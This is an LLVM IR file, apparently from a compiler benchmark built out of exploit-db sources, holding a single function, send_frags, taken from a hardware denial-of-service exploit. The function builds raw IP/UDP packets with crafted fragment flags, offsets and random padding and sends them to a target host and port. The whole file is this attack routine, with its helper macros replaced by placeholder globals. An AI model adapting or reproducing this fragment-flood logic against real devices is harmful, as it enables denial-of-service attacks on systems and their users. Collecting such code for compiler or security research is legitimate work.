; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_22440.c_send_frags.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_22440.c_send_frags.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@IPH = common dso_local global i32 0, align 4
@UDPH = common dso_local global i32 0, align 4
@PADDING = common dso_local global i32 0, align 4
@IP_MF = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"\0Asendto\00", align 1
@MAGIC2 = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @send_frags(i32 %0, i32 %1, i32 %2, i32 %3, i32 %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca %struct.sockaddr_in, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i32 %4, i32* %10, align 4
  store i32* null, i32** %12, align 8
  store i32* null, i32** %13, align 8
  %16 = load i32, i32* @AF_INET, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  store i32 %16, i32* %17, align 4
  %18 = load i32, i32* %9, align 4
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  store i32 %18, i32* %19, align 4
  %20 = load i32, i32* %8, align 4
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  %22 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %21, i32 0, i32 0
  store i32 %20, i32* %22, align 4
  %23 = load i32, i32* @IPH, align 4
  %24 = load i32, i32* @UDPH, align 4
  %25 = add nsw i32 %23, %24
  %26 = load i32, i32* @PADDING, align 4
  %27 = add nsw i32 %25, %26
  %28 = add nsw i32 %27, 40
  %29 = call i64 @malloc(i32 %28)
  %30 = inttoptr i64 %29 to i32*
  store i32* %30, i32** %12, align 8
  %31 = load i32*, i32** %12, align 8
  store i32* %31, i32** %13, align 8
  %32 = load i32*, i32** %13, align 8
  %33 = load i32, i32* @IPH, align 4
  %34 = load i32, i32* @UDPH, align 4
  %35 = add nsw i32 %33, %34
  %36 = load i32, i32* @PADDING, align 4
  %37 = add nsw i32 %35, %36
  %38 = call i32 @bzero(i32* %32, i32 %37)
  store i32 69, i32* %14, align 4
  %39 = load i32*, i32** %13, align 8
  %40 = call i32 @memcpy(i32* %39, i32* %14, i32 4)
  %41 = load i32*, i32** %13, align 8
  %42 = getelementptr inbounds i32, i32* %41, i64 2
  store i32* %42, i32** %13, align 8
  %43 = load i32, i32* @IPH, align 4
  %44 = load i32, i32* @UDPH, align 4
  %45 = add nsw i32 %43, %44
  %46 = add nsw i32 %45, 10
  %47 = call i32 @FIX(i32 %46)
  %48 = load i32*, i32** %13, align 8
  store i32 %47, i32* %48, align 4
  %49 = load i32*, i32** %13, align 8
  %50 = getelementptr inbounds i32, i32* %49, i64 2
  store i32* %50, i32** %13, align 8
  %51 = call i32 @htons(i32 242)
  %52 = load i32*, i32** %13, align 8
  store i32 %51, i32* %52, align 4
  %53 = load i32*, i32** %13, align 8
  %54 = getelementptr inbounds i32, i32* %53, i64 2
  store i32* %54, i32** %13, align 8
  %55 = load i32, i32* @IP_MF, align 4
  %56 = call i32 @FIX(i32 %55)
  %57 = load i32*, i32** %13, align 8
  %58 = load i32, i32* %57, align 4
  %59 = or i32 %58, %56
  store i32 %59, i32* %57, align 4
  %60 = load i32*, i32** %13, align 8
  %61 = getelementptr inbounds i32, i32* %60, i64 2
  store i32* %61, i32** %13, align 8
  %62 = load i32*, i32** %13, align 8
  store i32 64, i32* %62, align 4
  %63 = load i32, i32* @IPPROTO_UDP, align 4
  store i32 %63, i32* %14, align 4
  %64 = load i32*, i32** %13, align 8
  %65 = getelementptr inbounds i32, i32* %64, i64 1
  %66 = call i32 @memcpy(i32* %65, i32* %14, i32 4)
  %67 = load i32*, i32** %13, align 8
  %68 = getelementptr inbounds i32, i32* %67, i64 4
  store i32* %68, i32** %13, align 8
  %69 = load i32, i32* %7, align 4
  %70 = load i32*, i32** %13, align 8
  store i32 %69, i32* %70, align 4
  %71 = load i32*, i32** %13, align 8
  %72 = getelementptr inbounds i32, i32* %71, i64 4
  store i32* %72, i32** %13, align 8
  %73 = load i32, i32* %8, align 4
  %74 = load i32*, i32** %13, align 8
  store i32 %73, i32* %74, align 4
  %75 = load i32*, i32** %13, align 8
  %76 = getelementptr inbounds i32, i32* %75, i64 4
  store i32* %76, i32** %13, align 8
  %77 = load i32, i32* %9, align 4
  %78 = call i32 @htons(i32 %77)
  %79 = load i32*, i32** %13, align 8
  store i32 %78, i32* %79, align 4
  %80 = load i32*, i32** %13, align 8
  %81 = getelementptr inbounds i32, i32* %80, i64 2
  store i32* %81, i32** %13, align 8
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @htons(i32 %82)
  %84 = load i32*, i32** %13, align 8
  store i32 %83, i32* %84, align 4
  %85 = load i32*, i32** %13, align 8
  %86 = getelementptr inbounds i32, i32* %85, i64 2
  store i32* %86, i32** %13, align 8
  %87 = call i32 @htons(i32 18)
  %88 = load i32*, i32** %13, align 8
  store i32 %87, i32* %88, align 4
  %89 = load i32, i32* %6, align 4
  %90 = load i32*, i32** %12, align 8
  %91 = load i32, i32* @IPH, align 4
  %92 = load i32, i32* @UDPH, align 4
  %93 = add nsw i32 %91, %92
  %94 = add nsw i32 %93, 10
  %95 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %96 = call i32 @sendto(i32 %89, i32* %90, i32 %94, i32 0, %struct.sockaddr* %95, i32 4)
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %103

98:                                               ; preds = %5
  %99 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  %100 = load i32*, i32** %12, align 8
  %101 = call i32 @free(i32* %100)
  %102 = call i32 @exit(i32 1) #3
  unreachable

103:                                              ; preds = %5
  %104 = load i32*, i32** %12, align 8
  store i32* %104, i32** %13, align 8
  %105 = load i32*, i32** %13, align 8
  %106 = load i32, i32* @IPH, align 4
  %107 = load i32, i32* @UDPH, align 4
  %108 = add nsw i32 %106, %107
  %109 = load i32, i32* @PADDING, align 4
  %110 = add nsw i32 %108, %109
  %111 = call i32 @bzero(i32* %105, i32 %110)
  store i32 69, i32* %14, align 4
  %112 = load i32*, i32** %13, align 8
  %113 = call i32 @memcpy(i32* %112, i32* %14, i32 4)
  %114 = load i32*, i32** %13, align 8
  %115 = getelementptr inbounds i32, i32* %114, i64 2
  store i32* %115, i32** %13, align 8
  %116 = load i32, i32* @IPH, align 4
  %117 = load i32, i32* @UDPH, align 4
  %118 = add nsw i32 %116, %117
  %119 = load i32, i32* @MAGIC2, align 4
  %120 = add nsw i32 %118, %119
  %121 = call i32 @FIX(i32 %120)
  %122 = load i32*, i32** %13, align 8
  store i32 %121, i32* %122, align 4
  %123 = load i32*, i32** %13, align 8
  %124 = getelementptr inbounds i32, i32* %123, i64 2
  store i32* %124, i32** %13, align 8
  %125 = call i32 @htons(i32 242)
  %126 = load i32*, i32** %13, align 8
  store i32 %125, i32* %126, align 4
  %127 = load i32*, i32** %13, align 8
  %128 = getelementptr inbounds i32, i32* %127, i64 2
  store i32* %128, i32** %13, align 8
  %129 = call i32 @FIX(i32 6)
  %130 = load i32*, i32** %13, align 8
  store i32 %129, i32* %130, align 4
  %131 = load i32*, i32** %13, align 8
  %132 = getelementptr inbounds i32, i32* %131, i64 2
  store i32* %132, i32** %13, align 8
  %133 = load i32*, i32** %13, align 8
  store i32 64, i32* %133, align 4
  %134 = load i32, i32* @IPPROTO_UDP, align 4
  store i32 %134, i32* %14, align 4
  %135 = load i32*, i32** %13, align 8
  %136 = getelementptr inbounds i32, i32* %135, i64 1
  %137 = call i32 @memcpy(i32* %136, i32* %14, i32 4)
  %138 = load i32*, i32** %13, align 8
  %139 = getelementptr inbounds i32, i32* %138, i64 4
  store i32* %139, i32** %13, align 8
  %140 = load i32, i32* %7, align 4
  %141 = load i32*, i32** %13, align 8
  store i32 %140, i32* %141, align 4
  %142 = load i32*, i32** %13, align 8
  %143 = getelementptr inbounds i32, i32* %142, i64 4
  store i32* %143, i32** %13, align 8
  %144 = load i32, i32* %8, align 4
  %145 = load i32*, i32** %13, align 8
  store i32 %144, i32* %145, align 4
  %146 = load i32*, i32** %13, align 8
  %147 = getelementptr inbounds i32, i32* %146, i64 4
  store i32* %147, i32** %13, align 8
  %148 = load i32, i32* %9, align 4
  %149 = call i32 @htons(i32 %148)
  %150 = load i32*, i32** %13, align 8
  store i32 %149, i32* %150, align 4
  %151 = load i32*, i32** %13, align 8
  %152 = getelementptr inbounds i32, i32* %151, i64 2
  store i32* %152, i32** %13, align 8
  %153 = load i32, i32* %10, align 4
  %154 = call i32 @htons(i32 %153)
  %155 = load i32*, i32** %13, align 8
  store i32 %154, i32* %155, align 4
  %156 = load i32*, i32** %13, align 8
  %157 = getelementptr inbounds i32, i32* %156, i64 2
  store i32* %157, i32** %13, align 8
  %158 = load i32, i32* @MAGIC2, align 4
  %159 = add nsw i32 8, %158
  %160 = call i32 @htons(i32 %159)
  %161 = load i32*, i32** %13, align 8
  store i32 %160, i32* %161, align 4
  %162 = load i32, i32* %6, align 4
  %163 = load i32*, i32** %12, align 8
  %164 = load i32, i32* @IPH, align 4
  %165 = load i32, i32* @UDPH, align 4
  %166 = add nsw i32 %164, %165
  %167 = load i32, i32* @MAGIC2, align 4
  %168 = add nsw i32 %166, %167
  %169 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %170 = call i32 @sendto(i32 %162, i32* %163, i32 %168, i32 0, %struct.sockaddr* %169, i32 4)
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %172, label %177

172:                                              ; preds = %103
  %173 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  %174 = load i32*, i32** %12, align 8
  %175 = call i32 @free(i32* %174)
  %176 = call i32 @exit(i32 1) #3
  unreachable

177:                                              ; preds = %103
  %178 = load i32*, i32** %12, align 8
  store i32* %178, i32** %13, align 8
  %179 = load i32*, i32** %13, align 8
  %180 = load i32, i32* @IPH, align 4
  %181 = load i32, i32* @UDPH, align 4
  %182 = add nsw i32 %180, %181
  %183 = load i32, i32* @PADDING, align 4
  %184 = add nsw i32 %182, %183
  %185 = add nsw i32 %184, 40
  %186 = call i32 @bzero(i32* %179, i32 %185)
  store i32 79, i32* %14, align 4
  %187 = load i32*, i32** %13, align 8
  %188 = call i32 @memcpy(i32* %187, i32* %14, i32 4)
  %189 = load i32*, i32** %13, align 8
  %190 = getelementptr inbounds i32, i32* %189, i64 2
  store i32* %190, i32** %13, align 8
  %191 = load i32, i32* @IPH, align 4
  %192 = load i32, i32* @UDPH, align 4
  %193 = add nsw i32 %191, %192
  %194 = load i32, i32* @PADDING, align 4
  %195 = add nsw i32 %193, %194
  %196 = add nsw i32 %195, 40
  %197 = call i32 @FIX(i32 %196)
  %198 = load i32*, i32** %13, align 8
  store i32 %197, i32* %198, align 4
  %199 = load i32*, i32** %13, align 8
  %200 = getelementptr inbounds i32, i32* %199, i64 2
  store i32* %200, i32** %13, align 8
  %201 = call i32 @htons(i32 242)
  %202 = load i32*, i32** %13, align 8
  store i32 %201, i32* %202, align 4
  %203 = load i32*, i32** %13, align 8
  %204 = getelementptr inbounds i32, i32* %203, i64 2
  store i32* %204, i32** %13, align 8
  %205 = load i32, i32* @IP_MF, align 4
  %206 = call i32 @FIX(i32 %205)
  %207 = or i32 0, %206
  %208 = load i32*, i32** %13, align 8
  store i32 %207, i32* %208, align 4
  %209 = load i32*, i32** %13, align 8
  %210 = getelementptr inbounds i32, i32* %209, i64 2
  store i32* %210, i32** %13, align 8
  %211 = load i32*, i32** %13, align 8
  store i32 64, i32* %211, align 4
  %212 = load i32, i32* @IPPROTO_UDP, align 4
  store i32 %212, i32* %14, align 4
  %213 = load i32*, i32** %13, align 8
  %214 = getelementptr inbounds i32, i32* %213, i64 1
  %215 = call i32 @memcpy(i32* %214, i32* %14, i32 4)
  %216 = load i32*, i32** %13, align 8
  %217 = getelementptr inbounds i32, i32* %216, i64 4
  store i32* %217, i32** %13, align 8
  %218 = load i32, i32* %7, align 4
  %219 = load i32*, i32** %13, align 8
  store i32 %218, i32* %219, align 4
  %220 = load i32*, i32** %13, align 8
  %221 = getelementptr inbounds i32, i32* %220, i64 4
  store i32* %221, i32** %13, align 8
  %222 = load i32, i32* %8, align 4
  %223 = load i32*, i32** %13, align 8
  store i32 %222, i32* %223, align 4
  %224 = load i32*, i32** %13, align 8
  %225 = getelementptr inbounds i32, i32* %224, i64 44
  store i32* %225, i32** %13, align 8
  %226 = load i32, i32* %9, align 4
  %227 = call i32 @htons(i32 %226)
  %228 = load i32*, i32** %13, align 8
  store i32 %227, i32* %228, align 4
  %229 = load i32*, i32** %13, align 8
  %230 = getelementptr inbounds i32, i32* %229, i64 2
  store i32* %230, i32** %13, align 8
  %231 = load i32, i32* %10, align 4
  %232 = call i32 @htons(i32 %231)
  %233 = load i32*, i32** %13, align 8
  store i32 %232, i32* %233, align 4
  %234 = load i32*, i32** %13, align 8
  %235 = getelementptr inbounds i32, i32* %234, i64 2
  store i32* %235, i32** %13, align 8
  %236 = load i32, i32* @PADDING, align 4
  %237 = add nsw i32 8, %236
  %238 = call i32 @htons(i32 %237)
  %239 = load i32*, i32** %13, align 8
  store i32 %238, i32* %239, align 4
  store i32 0, i32* %11, align 4
  br label %240

240:                                              ; preds = %252, %177
  %241 = load i32, i32* %11, align 4
  %242 = load i32, i32* @PADDING, align 4
  %243 = icmp slt i32 %241, %242
  br i1 %243, label %244, label %255

244:                                              ; preds = %240
  %245 = call i32 (...) @random()
  %246 = srem i32 %245, 255
  %247 = load i32*, i32** %13, align 8
  %248 = load i32, i32* %11, align 4
  %249 = add nsw i32 %248, 1
  store i32 %249, i32* %11, align 4
  %250 = sext i32 %248 to i64
  %251 = getelementptr inbounds i32, i32* %247, i64 %250
  store i32 %246, i32* %251, align 4
  br label %252

252:                                              ; preds = %244
  %253 = load i32, i32* %11, align 4
  %254 = add nsw i32 %253, 1
  store i32 %254, i32* %11, align 4
  br label %240

255:                                              ; preds = %240
  %256 = load i32, i32* %6, align 4
  %257 = load i32*, i32** %12, align 8
  %258 = load i32, i32* @IPH, align 4
  %259 = load i32, i32* @UDPH, align 4
  %260 = add nsw i32 %258, %259
  %261 = load i32, i32* @PADDING, align 4
  %262 = add nsw i32 %260, %261
  %263 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %264 = call i32 @sendto(i32 %256, i32* %257, i32 %262, i32 0, %struct.sockaddr* %263, i32 4)
  %265 = icmp eq i32 %264, -1
  br i1 %265, label %266, label %271

266:                                              ; preds = %255
  %267 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  %268 = load i32*, i32** %12, align 8
  %269 = call i32 @free(i32* %268)
  %270 = call i32 @exit(i32 1) #3
  unreachable

271:                                              ; preds = %255
  %272 = load i32*, i32** %12, align 8
  %273 = call i32 @free(i32* %272)
  ret void
}

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @bzero(i32*, i32) #1

declare dso_local i32 @memcpy(i32*, i32*, i32) #1

declare dso_local i32 @FIX(i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @sendto(i32, i32*, i32, i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @free(i32*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @random(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
